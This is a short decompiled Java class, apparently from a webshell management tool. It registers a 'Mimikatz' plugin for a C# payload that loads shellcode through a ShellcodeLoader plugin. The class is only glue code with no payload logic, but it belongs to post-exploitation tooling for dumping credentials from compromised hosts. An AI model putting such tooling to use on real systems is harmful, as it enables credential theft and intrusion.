//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.cshap;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.ShellcodeLoader;

@PluginAnnotation(
        payloadName = "CShapDynamicPayload",
        Name = "Mimikatz",
        DisplayName = "Mimikatz"
)
public class Mimikatz extends shells.plugins.generic.Mimikatz {
    public Mimikatz() {
    }

    protected ShellcodeLoader getShellcodeLoader() {
        return (ShellcodeLoader)super.shellEntity.getFrame().getPlugin("ShellcodeLoader");
    }
}
